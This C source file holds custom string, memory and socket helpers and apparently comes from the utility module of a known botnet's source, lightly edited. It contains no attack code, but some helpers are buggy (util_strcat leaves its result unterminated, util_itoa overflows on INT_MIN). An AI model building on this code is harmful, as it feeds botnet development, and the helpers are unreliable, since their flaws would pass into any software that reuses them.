#define _GNU_SOURCE

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

BOOL mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

int util_strlen(const char *str) {
    size_t length = 0;
    while (*str != '\0') { // Fixed variable name in loop condition
        length++;
        str++;
    }
    return length;
}

int util_strncmp(const char *str1, const char *str2, size_t n) {
    for (size_t i = 0; i < n; i++) {
        if (str1[i] != str2[i]) { // Fixed variable names
            return (str1[i] < str2[i]) ? -1 : 1;
        }
        if (str1[i] == '\0') {
            return 0;
        }
    }
    return 0;
}

int util_strcmp(const char *str1, const char *str2) {
    while (*str1 != '\0' && *str1 == *str2) { // Fixed variable name
        str1++;
        str2++;
    }
    return *(const unsigned char *)str1 - *(const unsigned char *)str2;
}

int util_strcpy(char *dst, const char *src) {
    int len = 0;
    char *p = dst;
    while (*src != '\0') {
        *p++ = *src++;
        len++;
    }
    *p = '\0';
    return len;
}

void util_strcat(char *dst, char *src) {
    while (*dst)
        dst++;

    while (*src)
        *dst++ = *src++;
}

void util_memcpy(void *dst, const void *src, size_t n) {
    char *d = dst;
    const char *s = src;
    for (size_t i = 0; i < n; i++) {
        d[i] = s[i];
    }
}

void *util_zero(void *buf, size_t len) { // Changed return type to void *
    unsigned char *p = buf;
    for (size_t i = 0; i < len; i++) {
        p[i] = (unsigned char)0;
    }
    return buf;
}

int util_atoi(const char *str) {
    int num = 0;
    int sign = 1;
    while (*str != '\0') {
        if (*str == '-') {
            sign = -1;
        } else if (*str >= '0' && *str <= '9') {
            num = num * 10 + (*str - '0');
        } else {
            break;
        }
        str++; // Fixed indentation
    }
    return num * sign;
}

char *util_itoa(int num, char *str, int base) {
    if (num == 0) {
        str[0] = '0';
        str[1] = '\0';
        return str;
    }
    int i = 0;
    int is_negative = 0;
    if (num < 0 && base == 10) {
        is_negative = 1;
        num = -num;
    }
    while (num != 0) {
        int rem = num % base;
        str[i++] = (rem > 9) ? (rem - 10) + 'a' : rem + '0';
        num /= base;
    }
    if (is_negative) {
        str[i++] = '-';
    }
    str[i] = '\0';
    int len = i;
    i = 0;
    while (i < len / 2) {
        char temp = str[i];
        str[i] = str[len - i - 1];
        str[len - i - 1] = temp;
        i++;
    }
    return str;
}

int util_memsearch(const char *buf, size_t buf_len, const char *mem, size_t mem_len) {
    int i, matched = 0;
    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }
    return -1;
}

int *util_stristr(const char *haystack, const char *needle) {
    char *ptr = haystack;
    int haystack_len = util_strlen(haystack);
    int needle_len = util_strlen(needle);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = needle[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == needle_len)
                return (int *)(ptr - needle);
        }
        else
            match_count = 0;
    }

    return NULL;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util/err]: Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
